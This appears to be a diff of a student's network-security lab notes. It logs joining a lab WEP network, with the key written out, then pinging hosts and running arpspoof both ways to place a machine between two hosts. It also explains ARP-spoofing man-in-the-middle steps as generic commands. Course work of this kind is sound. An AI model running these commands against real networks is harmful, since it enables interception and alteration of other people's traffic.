@@ -366,7 +366,7 @@ Notes for this assignment:
 	* After entering the WEP key for "netsec-wep" which is "C0FFEE4221611E4A1A446E2F20" we see that we successfully connected to the network and can continue with the arp spoofing part.
 
 		```
-			cs@cs-VirtualBox:~/netsec-repo/assignment-2$ iwconfig
+			cs@cs-VirtualBox:~$ iwconfig
 				lo        no wireless extensions.
 
 				enp0s3    no wireless extensions.
@@ -380,7 +380,7 @@ Notes for this assignment:
 				          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
 				          Tx excessive retries:11  Invalid misc:61   Missed beacon:0
 
-			cs@cs-VirtualBox:~/netsec-repo/assignment-2$ ifconfig
+			cs@cs-VirtualBox:~$ ifconfig
 				enp0s3    Link encap:Ethernet  HWaddr 08:00:27:59:8a:48  
 				          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
 				          inet6 addr: fe80::f230:387:60ab:e8e8/64 Scope:Link
@@ -408,7 +408,7 @@ Notes for this assignment:
 				          collisions:0 txqueuelen:1000 
 				          RX bytes:52639 (52.6 KB)  TX bytes:28154 (28.1 KB)
 
-			cs@cs-VirtualBox:~/netsec-repo/assignment-2$ ping -I wlx00c0ca5a50a5 192.168.84.10
+			cs@cs-VirtualBox:~$ ping -I wlx00c0ca5a50a5 192.168.84.10
 				PING 192.168.84.10 (192.168.84.10) from 192.168.84.158 wlx00c0ca5a50a5: 56(84) bytes of data.
 				64 bytes from 192.168.84.10: icmp_seq=1 ttl=64 time=109 ms
 				64 bytes from 192.168.84.10: icmp_seq=2 ttl=64 time=126 ms
@@ -417,7 +417,7 @@ Notes for this assignment:
 				64 bytes from 192.168.84.10: icmp_seq=6 ttl=64 time=108 ms
 				64 bytes from 192.168.84.10: icmp_seq=7 ttl=64 time=143 ms
 
-			cs@cs-VirtualBox:~/netsec-repo/assignment-2$ ping -I wlx00c0ca5a50a5 192.168.84.20
+			cs@cs-VirtualBox:~$ ping -I wlx00c0ca5a50a5 192.168.84.20
 				PING 192.168.84.20 (192.168.84.20) from 192.168.84.158 wlx00c0ca5a50a5: 56(84) bytes of data.
 				64 bytes from 192.168.84.20: icmp_seq=1 ttl=64 time=321 ms
 				64 bytes from 192.168.84.20: icmp_seq=2 ttl=64 time=115 ms
@@ -426,7 +426,7 @@ Notes for this assignment:
 				64 bytes from 192.168.84.20: icmp_seq=5 ttl=64 time=108 ms
 				64 bytes from 192.168.84.20: icmp_seq=6 ttl=64 time=104 ms
 
-			cs@cs-VirtualBox:~/netsec-repo/assignment-2$ ping -I wlx00c0ca5a50a5 192.168.84.60
+			cs@cs-VirtualBox:~$ ping -I wlx00c0ca5a50a5 192.168.84.60
 				PING 192.168.84.60 (192.168.84.60) from 192.168.84.158 wlx00c0ca5a50a5: 56(84) bytes of data.
 				64 bytes from 192.168.84.60: icmp_seq=1 ttl=64 time=1163 ms
 				64 bytes from 192.168.84.60: icmp_seq=2 ttl=64 time=144 ms
@@ -435,7 +435,7 @@ Notes for this assignment:
 				64 bytes from 192.168.84.60: icmp_seq=5 ttl=64 time=475 ms
 				64 bytes from 192.168.84.60: icmp_seq=6 ttl=64 time=118 ms
 
-			cs@cs-VirtualBox:~/netsec-repo/assignment-2$ ping -I wlx00c0ca5a50a5 192.168.84.43
+			cs@cs-VirtualBox:~$ ping -I wlx00c0ca5a50a5 192.168.84.43
 				PING 192.168.84.43 (192.168.84.43) from 192.168.84.158 wlx00c0ca5a50a5: 56(84) bytes of data.
 				64 bytes from 192.168.84.43: icmp_seq=1 ttl=64 time=1299 ms
 				64 bytes from 192.168.84.43: icmp_seq=2 ttl=64 time=272 ms
@@ -444,7 +444,7 @@ Notes for this assignment:
 				64 bytes from 192.168.84.43: icmp_seq=5 ttl=64 time=371 ms
 				64 bytes from 192.168.84.43: icmp_seq=6 ttl=64 time=952 ms	
 		
-			cs@cs-VirtualBox:~/netsec-repo/assignment-2$ sudo arpspoof -i wlx00c0ca5a50a5 -t 192.168.84.43 192.168.84.83
+			cs@cs-VirtualBox:~$ sudo arpspoof -i wlx00c0ca5a50a5 -t 192.168.84.43 192.168.84.83
 				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
 				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
 				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
@@ -454,7 +454,7 @@ Notes for this assignment:
 				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
 				0:c0:ca:5a:50:a5 0:f:c9:c:ee:ed 0806 42: arp reply 192.168.84.83 is-at 0:c0:ca:5a:50:a5
 
-			cs@cs-VirtualBox:~/netsec-repo/assignment-2$ sudo arpspoof -i wlx00c0ca5a50a5 -t 192.168.84.83 192.168.84.43
+			cs@cs-VirtualBox:~$ sudo arpspoof -i wlx00c0ca5a50a5 -t 192.168.84.83 192.168.84.43
 				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5
 				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5
 				0:c0:ca:5a:50:a5 0:f:c9:c:f7:8c 0806 42: arp reply 192.168.84.43 is-at 0:c0:ca:5a:50:a5
@@ -467,6 +467,15 @@ Notes for this assignment:
 		* ![Ping](img/4a_ping.PNG)
 		* ![ARPSpoofing_one](img/4a_udp_1.PNG)
 		* ![ARPSpoofing_two](img/4a_udp_2.PNG)
+
+		As we take a look at the screenshots above we see that pinging the hosts is actually working (ICMP). Portforwarding and arp spoofing is also working by inspecting the two UDP packets. The first one is sent from host A to our machine and then from our machine to host B. To get some more insights on how the arpspoof command actually works, I looked into the man pages and also took two additional websites into account because they had some more sophisticated examples, namely:
+		* https://security.stackexchange.com/questions/113524/a-question-about-arpspoof-command
+		* http://linux-hacking-guide.blogspot.nl/2015/05/man-in-middle-attack-using-arpspoof-in.html
+
+		Arp spoofing works like this:
+		1. Tell the 'victim' that we are 'gateway'. Open a terminal window and type the below command: ``` arpspoof -i <interface_name> -t victimIP gatewayIP ```
+		2. Tell the 'gateway' that we are 'victim'. Open a terminal window and type the below command: ``` arpspoof -i <interface_name> -t gatewayIP victimIP ```				
+		3. Enable ip forwarding and start capturing packets or alter package content and forward it.
 
 	b) Start with your implementation of the sniffer from exercise 4 of last week, or use the implementation provided. **Rename it to mitm.py, and place it in the folder exercise4. Change it so that it rewrites the packets according to the instructions contained inside the packet, then sends them on.** For this, you will need to make several changes:
 
